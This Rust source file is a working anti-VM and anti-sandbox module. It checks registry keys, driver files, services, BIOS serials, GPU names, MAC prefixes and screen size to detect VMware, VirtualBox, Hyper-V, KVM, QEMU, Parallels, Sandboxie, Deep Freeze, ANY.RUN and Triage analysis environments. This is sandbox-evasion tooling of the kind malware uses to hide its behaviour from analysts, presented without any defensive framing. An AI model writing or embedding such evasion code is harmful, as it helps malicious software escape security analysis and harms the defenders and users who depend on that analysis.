use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};

// ============================================================================
// ANTI-VM MODULE
// Contains all virtual machine and hypervisor detection mechanisms
// ============================================================================

/// Main VM detection function
pub fn run_vm_checks() -> bool {
    shadow_defender_detection::detect_shadow_defender() ||
    anyrun_detection::anyrun_detection().unwrap_or(false) ||
    comodo_antivirus_detection::detect_comodo_antivirus() ||
    deep_freeze_detection::detect_deep_freeze() ||
    hyperv_check::detect_hyperv().unwrap_or(false) ||
    kvm_check::check_for_kvm().unwrap_or(false) ||
    parallels_check::check_for_parallels().unwrap_or(false) ||
    qemu_check::check_for_qemu().unwrap_or(false) ||
    sandboxie_detection::detect_sandboxie() ||
    virtualbox_detection::graphics_card_check().unwrap_or(false) ||
    vm_artifacts::vm_artifacts_detect() ||
    vm_platform_check::detect_vm_platform().unwrap_or(false) ||
    vmware_detection::graphics_card_check().unwrap_or(false)
}

pub mod shadow_defender_detection {
    use super::utils::*;
    
    pub fn detect_shadow_defender() -> bool {
        if let Some(pf) = get_env_var("ProgramFiles") {
            if path_exists(&format!("{}\\Shadow Defender\\", pf)) { return true; }
        }
        if let Some(pf_x86) = get_env_var("ProgramFiles(x86)") {
            if path_exists(&format!("{}\\Shadow Defender\\", pf_x86)) { return true; }
        }
        if registry_value_exists("HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Shadow Defender") { return true; }
        if registry_key_exists("HKCR", "CLSID\\{78C3F4BC-C7BC-48E4-AD72-2DD16F6704A9}") { return true; }
        if registry_key_exists("HKCR", "TypeLib\\{3A5C2EFF-619A-481D-8D5D-A6968DB02AF1}\\1.0\\0\\win64") { return true; }
        if registry_key_exists("HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{93A07A0D-454E-43d1-86A9-5DE9C5F4411A}") { return true; }
        if registry_key_exists("HKLM", "SOFTWARE\\Shadow Defender") { return true; }
        if registry_key_exists("HKLM", "SYSTEM\\ControlSet001\\Services\\{0CBD4F48-3751-475D-BE88-4F271385B672}") { return true; }
        if registry_key_exists("HKLM", "SYSTEM\\ControlSet001\\Services\\diskpt") { return true; }
        if service_exists("Shadow Defender Service") { return true; }
        false
    }
}

pub mod anyrun_detection {
    use std::process::Command;
    pub fn anyrun_detection() -> Result<bool, String> {
        if let Ok(output) = Command::new("getmac").output() {
            let output_str = String::from_utf8_lossy(&output.stdout);
            if output_str.to_uppercase().contains("52-54-00") { return Ok(true); }
        }
        Ok(false)
    }
}

pub mod comodo_antivirus_detection {
    use super::utils::*;
    pub fn detect_comodo_antivirus() -> bool {
        if let Some(pf) = get_env_var("ProgramFiles") { if path_exists(&format!("{}\\COMODO\\COMODO Internet Security\\", pf)) { return true; }}
        if let Some(pf_x86) = get_env_var("ProgramFiles(x86)") { if path_exists(&format!("{}\\COMODO\\COMODO Internet Security\\", pf_x86)) { return true; }}
        if let Some(sys_root) = get_env_var("SystemRoot") { if path_exists(&format!("{}\\System32\\drivers\\cmdguard.sys", sys_root)) { return true; }}
        if registry_key_exists("HKLM", "SOFTWARE\\COMODO\\CIS") { return true; }
        if service_exists("cmdagent") { return true; }
        false
    }
}

pub mod deep_freeze_detection {
    use super::utils::*;
    pub fn detect_deep_freeze() -> bool {
        if let Some(pf) = get_env_var("ProgramFiles") { if path_exists(&format!("{}\\Faronics\\Deep Freeze\\", pf)) { return true; }}
        if let Some(pf_x86) = get_env_var("ProgramFiles(x86)") { if path_exists(&format!("{}\\Faronics\\Deep Freeze\\", pf_x86)) { return true; }}
        if let Some(sys_root) = get_env_var("SystemRoot") { if path_exists(&format!("{}\\Persi0.sys", sys_root)) { return true; }}
        if registry_key_exists("HKCR", "TypeLib\\{C5D763D9-2422-4B2D-A425-02D5BD016239}\\1.0\\HELPDIR") { return true; }
        if let Ok(output) = get_command_output("reg", &["query", "HKLM\\SOFTWARE\\Microsoft\\Wbem\\CIMOM", "/v", "Autorecover MOFs"]) {
            if output.to_lowercase().contains("faronics") { return true; }
        }
        if service_is_running("DFServ") { return true; }
        false
    }
}

pub mod hyperv_check {
    use super::utils::*;
    pub fn detect_hyperv() -> Result<bool, String> {
        if let Ok(output) = get_command_output("reg", &["query", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Virtualization", "/v", "Enabled"]) {
            if output.contains("0x1") { return Ok(true); }
        }
        if service_is_running("vmms") || service_is_running("vmbus") { return Ok(true); }
        if process_is_running("vmms.exe") { return Ok(true); }
        Ok(false)
    }
}

pub mod kvm_check {
    use super::utils::*;
    pub fn check_for_kvm() -> Result<bool, String> {
        let bad_drivers = ["balloon.sys", "netkvm.sys", "vioinput", "viofs.sys", "vioser.sys"];
        if let Some(system_root) = get_env_var("SystemRoot") {
            let system32_path = format!("{}\\System32", system_root);
            for driver in &bad_drivers {
                if path_exists(&format!("{}\\{}", system32_path, driver)) { return Ok(true); }
            }
        }
        Ok(false)
    }
}

pub mod monitor_metrics {
    use super::*;
    pub fn is_screen_small() -> std::result::Result<bool, String> {
        unsafe {
            let width = GetSystemMetrics(SM_CXSCREEN);
            let height = GetSystemMetrics(SM_CYSCREEN);
            Ok(width < 800 || height < 600)
        }
    }
}

pub mod parallels_check {
    use std::fs;
    use super::utils::*;
    pub fn check_for_parallels() -> Result<bool, String> {
        let parallels_drivers = ["prl_sf", "prl_tg", "prl_eth"];
        if let Some(sys_root) = get_env_var("SystemRoot") {
            let sys32_folder = format!("{}\\System32", sys_root);
            if let Ok(entries) = fs::read_dir(&sys32_folder) {
                for entry in entries.flatten() {
                    let filename = entry.file_name().to_string_lossy().to_lowercase();
                    if parallels_drivers.iter().any(|d| filename.contains(d)) { return Ok(true); }
                }
            }
        }
        Ok(false)
    }
}

pub mod qemu_check {
    use std::fs;
    use super::utils::*;
    pub fn check_for_qemu() -> Result<bool, String> {
        let qemu_drivers = ["qemu-ga", "qemuwmi"];
        if let Some(sys_root) = get_env_var("SystemRoot") {
            let sys32 = format!("{}\\System32", sys_root);
            if let Ok(entries) = fs::read_dir(&sys32) {
                for entry in entries.flatten() {
                    let filename = entry.file_name().to_string_lossy().to_lowercase();
                    if qemu_drivers.iter().any(|d| filename.contains(d)) { return Ok(true); }
                }
            }
        }
        Ok(false)
    }
}

pub mod sandboxie_detection {
    use super::utils::*;
    pub fn detect_sandboxie() -> bool {
        if let Some(pf) = get_env_var("ProgramFiles") { if path_exists(&format!("{}\\Sandboxie\\", pf)) { return true; }}
        if let Some(pf_x86) = get_env_var("ProgramFiles(x86)") { if path_exists(&format!("{}\\Sandboxie\\", pf_x86)) { return true; }}
        if service_exists("SbieSvc") { return true; }
        let keys = [ "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie"];
        for key in &keys { if execute_command("reg", &["query", key]) { return true; } }
        false
    }
}

pub mod triage_detection {
    use super::powershell_check;
    pub fn triage_check() -> Result<bool, String> {
        let output = powershell_check::run_powershell_command("Get-CimInstance -ClassName Win32_DiskDrive | Select-Object -ExpandProperty Model")?;
        let output_upper = output.to_uppercase();
        Ok(output_upper.contains("DADY HARDDISK") || output_upper.contains("QEMU HARDDISK"))
    }
}

pub mod virtualbox_detection {
    use super::powershell_check;
    pub fn graphics_card_check() -> Result<bool, String> {
        let output = powershell_check::run_powershell_command("Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name")?;
        Ok(output.to_lowercase().contains("virtualbox"))
    }
}

pub mod vm_artifacts {
    use std::fs;
    use std::path::Path;
    use super::utils::*;

    pub fn vm_artifacts_detect() -> bool {
        const BAD_FILE_NAMES: &[&str] = &[ "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys", "vboxogl.dll" ];
        if let Some(sys_root) = get_env_var("SystemRoot") {
            let system32_folder = format!("{}\\System32", sys_root);
            if let Ok(entries) = fs::read_dir(&system32_folder) {
                for entry in entries.flatten() {
                    let filename = entry.file_name().to_string_lossy().to_lowercase();
                    if BAD_FILE_NAMES.iter().any(|&f| filename == f.to_lowercase()) { return true; }
                }
            }
        }
        if let Some(pf) = get_env_var("ProgramFiles") { if Path::new(&format!("{}\\VMware", pf)).exists() || Path::new(&format!("{}\\oracle\\virtualbox guest additions", pf)).exists() { return true; } }
        if let Some(pf_x86) = get_env_var("ProgramFiles(x86)") { if Path::new(&format!("{}\\VMware", pf_x86)).exists() || Path::new(&format!("{}\\oracle\\virtualbox guest additions", pf_x86)).exists() { return true; } }
        false
    }
}

pub mod vm_platform_check {
    use super::powershell_check;
    fn get_bios_serial() -> Result<String, String> { powershell_check::run_powershell_command("Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty SerialNumber") }
    fn get_system_product_name() -> Result<String, String> { powershell_check::run_powershell_command("Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty Model") }
    fn get_system_manufacturer() -> Result<String, String> { powershell_check::run_powershell_command("Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer") }

    pub fn detect_vm_platform() -> Result<bool, String> {
        let serial = get_bios_serial()?.to_lowercase();
        let model = get_system_product_name()?.to_lowercase();
        let manufacturer = get_system_manufacturer()?.to_lowercase();

        if serial == "0" { return Ok(true); }
        let vm_indicators = ["vmware", "virtual", "microsoft", "innotek", "virtualbox"];
        for indicator in &vm_indicators {
            if model.contains(indicator) || manufacturer.contains(indicator) || serial.contains(indicator) { return Ok(true); }
        }
        Ok(false)
    }
}

pub mod vmware_detection {
    use super::powershell_check;
    pub fn graphics_card_check() -> Result<bool, String> {
        let output = powershell_check::run_powershell_command("Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name")?;
        Ok(output.to_lowercase().contains("vmware"))
    }
}

pub mod powershell_check {
    use std::process::Command;
    pub fn run_powershell_command(ps_command: &str) -> Result<String, String> {
        let output = Command::new("powershell.exe").args(&["-NoProfile", "-NonInteractive", "-Command", ps_command]).output().map_err(|e| format!("Failed to execute PowerShell command: {}", e))?;
        if output.status.success() { Ok(String::from_utf8_lossy(&output.stdout).trim().to_string()) } 
        else { Err(String::from_utf8_lossy(&output.stderr).to_string()) }
    }
}

pub mod utils {
    use std::process::Command;

    /// Execute a command and return whether it succeeded
    pub fn execute_command(cmd: &str, args: &[&str]) -> bool {
        Command::new(cmd)
            .args(args)
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false)
    }

    /// Execute a command and return its output as a string
    pub fn get_command_output(cmd: &str, args: &[&str]) -> Result<String, String> {
        let output = Command::new(cmd)
            .args(args)
            .output()
            .map_err(|e| format!("Failed to execute command: {}", e))?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            Err(String::from_utf8_lossy(&output.stderr).to_string())
        }
    }

    /// Check if a file or directory exists
    pub fn path_exists(path: &str) -> bool {
        std::fs::metadata(path).is_ok()
    }

    /// Check if a registry key exists using reg command
    pub fn registry_key_exists(hive: &str, key_path: &str) -> bool {
        execute_command("reg", &["query", &format!("{}\\{}", hive, key_path)])
    }

    /// Check if a registry value exists using reg command
    pub fn registry_value_exists(hive: &str, key_path: &str, value_name: &str) -> bool {
        execute_command("reg", &["query", &format!("{}\\{}", hive, key_path), "/v", value_name])
    }

    /// Check if a service exists and is running
    pub fn service_is_running(service_name: &str) -> bool {
        if let Ok(output) = get_command_output("sc", &["query", service_name]) {
            output.contains("RUNNING")
        } else {
            false
        }
    }

    /// Check if a service exists (regardless of state)
    pub fn service_exists(service_name: &str) -> bool {
        execute_command("sc", &["query", service_name])
    }

    /// Get environment variable safely
    pub fn get_env_var(var_name: &str) -> Option<String> {
        std::env::var(var_name).ok()
    }

    /// Check if a process is running by name
    pub fn process_is_running(process_name: &str) -> bool {
        if let Ok(output) = get_command_output("tasklist", &["/fi", &format!("imagename eq {}", process_name)]) {
            output.to_lowercase().contains(&process_name.to_lowercase())
        } else {
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_vm_detection() {
        println!("VM environment detected: {}", run_vm_checks());
    }

    #[test]
    fn test_hyperv() {
        if let Ok(result) = hyperv_check::detect_hyperv() {
            println!("Hyper-V detected: {}", result);
        }
    }

    #[test]
    fn test_virtualbox() {
        if let Ok(result) = virtualbox_detection::graphics_card_check() {
            println!("VirtualBox detected: {}", result);
        }
    }

    #[test]
    fn test_vmware() {
        if let Ok(result) = vmware_detection::graphics_card_check() {
            println!("VMware detected: {}", result);
        }
    }

    #[test]
    fn test_screen_size() {
        if let Ok(small_screen) = monitor_metrics::is_screen_small() {
            println!("Small screen detected: {}", small_screen);
        }
    }
}
